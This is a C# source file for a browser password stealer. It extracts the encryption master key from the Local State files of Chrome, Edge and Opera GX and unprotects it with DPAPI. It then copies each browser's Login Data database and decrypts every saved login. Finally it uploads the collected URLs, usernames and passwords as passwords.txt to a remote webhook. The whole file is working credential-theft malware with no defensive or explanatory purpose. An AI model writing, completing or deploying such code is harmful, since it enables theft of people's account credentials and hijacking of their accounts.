using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Threading.Tasks;
using System.Net.Http;
using Newtonsoft.Json;
using System.Data.SQLite;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Engines;


namespace NoMoSchoo
{
    public static class Pass
    {
        // Removed constant WEBHOOK_URL. We'll use WebhookManager.GetWebhookUrlAsync() instead.

        public static byte[] GetMasterKey(string browser)
        {
            string localStatePath = string.Empty;
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            switch (browser.ToLower())
            {
                case "edge":
                    localStatePath = Path.Combine(userProfile, @"AppData\Local\Microsoft\Edge\User Data\Local State");
                    break;
                case "chrome":
                    localStatePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Local State");
                    break;
                case "opera":
                    localStatePath = Path.Combine(userProfile, @"AppData\Roaming\Opera Software\Opera GX Stable\Local State");
                    break;
                default:
                    return null;
            }
            if (!File.Exists(localStatePath))
            {
                return null;
            }
            try
            {
                string jsonText = File.ReadAllText(localStatePath);
                dynamic localState = JsonConvert.DeserializeObject(jsonText);
                string encryptedKeyB64 = localState["os_crypt"]["encrypted_key"];
                byte[] encryptedKeyWithPrefix = Convert.FromBase64String(encryptedKeyB64);
                byte[] encryptedKey = new byte[encryptedKeyWithPrefix.Length - 5];
                Array.Copy(encryptedKeyWithPrefix, 5, encryptedKey, 0, encryptedKey.Length);
                byte[] masterKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
                return masterKey;
            }
            catch (Exception)
            {
                return null;
            }
        }

        public static string DecryptPassword(byte[] encryptedData, byte[] masterKey)
        {
            try
            {
                if (encryptedData == null || encryptedData.Length < (3 + 12 + 16))
                    return "";

                int ivOffset = 3;
                int ivLength = 12;
                byte[] iv = new byte[ivLength];
                Array.Copy(encryptedData, ivOffset, iv, 0, ivLength);

                int tagLength = 16;
                int cipherTextLength = encryptedData.Length - 3 - ivLength - tagLength;
                if (cipherTextLength <= 0)
                    return "";

                byte[] cipherText = new byte[cipherTextLength];
                Array.Copy(encryptedData, ivOffset + ivLength, cipherText, 0, cipherTextLength);

                byte[] tag = new byte[tagLength];
                Array.Copy(encryptedData, encryptedData.Length - tagLength, tag, 0, tagLength);

                byte[] cipherTextWithTag = new byte[cipherTextLength + tagLength];
                Array.Copy(cipherText, 0, cipherTextWithTag, 0, cipherTextLength);
                Array.Copy(tag, 0, cipherTextWithTag, cipherTextLength, tagLength);

                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                AeadParameters parameters = new AeadParameters(new KeyParameter(masterKey), 128, iv, null);
                cipher.Init(false, parameters);

                byte[] plainText = new byte[cipher.GetOutputSize(cipherTextWithTag.Length)];
                int len = cipher.ProcessBytes(cipherTextWithTag, 0, cipherTextWithTag.Length, plainText, 0);
                cipher.DoFinal(plainText, len);

                return Encoding.UTF8.GetString(plainText).TrimEnd('\0');
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Password decryption failed: {ex.Message}");
                return "Decryption failed";
            }
        }

        public static Dictionary<string, (string username, string password)> GetPasswords(string browser)
        {
            var passwords = new Dictionary<string, (string username, string password)>();
            byte[] masterKey = GetMasterKey(browser);
            if (masterKey == null)
                return passwords;

            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string loginDataPath = string.Empty;
            switch (browser.ToLower())
            {
                case "edge":
                    loginDataPath = Path.Combine(userProfile, @"AppData\Local\Microsoft\Edge\User Data\Default\Login Data");
                    break;
                case "chrome":
                    loginDataPath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Default\Login Data");
                    break;
                case "opera":
                    loginDataPath = Path.Combine(userProfile, @"AppData\Roaming\Opera Software\Opera GX Stable\Login Data");
                    break;
                default:
                    return passwords;
            }
            if (!File.Exists(loginDataPath))
                return passwords;

            string tempFile = Path.Combine(Path.GetTempPath(), "Loginvault.db");
            try
            {
                File.Copy(loginDataPath, tempFile, true);
            }
            catch (Exception)
            {
                return passwords;
            }

            try
            {
                using (var connection = new SQLiteConnection($"Data Source={tempFile};Version=3;"))
                {
                    connection.Open();
                    using (var command = new SQLiteCommand("SELECT action_url, username_value, password_value FROM logins", connection))
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string url = reader.IsDBNull(0) ? "" : reader.GetString(0);
                            string username = reader.IsDBNull(1) ? "" : reader.GetString(1);
                            byte[] encryptedPassword = (byte[])reader["password_value"];
                            string decryptedPassword = DecryptPassword(encryptedPassword, masterKey);
                            if (!string.IsNullOrEmpty(username) || !string.IsNullOrEmpty(decryptedPassword))
                            {
                                passwords[url] = (username, decryptedPassword);
                            }
                        }
                    }
                    connection.Close();
                }
            }
            catch (Exception)
            {
                // Optionally log query error.
            }
            try
            {
                File.Delete(tempFile);
            }
            catch (Exception)
            {
                // Optionally log deletion error.
            }
            return passwords;
        }

        public static async Task SendToWebhookAsync(Dictionary<string, (string username, string password)> passwords)
        {
            if (passwords == null || passwords.Count == 0)
            {
                return;
            }
            StringBuilder sb = new StringBuilder();
            foreach (var kvp in passwords)
            {
                sb.AppendLine($"URL: {kvp.Key}");
                sb.AppendLine($"Username: {kvp.Value.username}");
                sb.AppendLine($"Password: {kvp.Value.password}");
                sb.AppendLine();
            }
            string content = sb.ToString();

            using (var client = new HttpClient())
            using (var form = new MultipartFormDataContent())
            {
                var fileContent = new StringContent(content, Encoding.UTF8, "text/plain");
                form.Add(fileContent, "file", "passwords.txt");

                // Retrieve the webhook URL from WebhookManager.
                string webhookUrl = await WebhookManager.GetWebhookUrlAsync();

                HttpResponseMessage response = await client.PostAsync(webhookUrl, form);
                // Optionally check the response status.
            }
        }

        public static async Task ExtractAndSendPasswordsAsync()
        {
            var allPasswords = new Dictionary<string, (string username, string password)>();
            foreach (var browser in new string[] { "chrome", "edge", "opera" })
            {
                var browserPasswords = GetPasswords(browser);
                foreach (var kvp in browserPasswords)
                {
                    allPasswords[kvp.Key] = kvp.Value;
                }
            }
            await SendToWebhookAsync(allPasswords);
        }
    }
}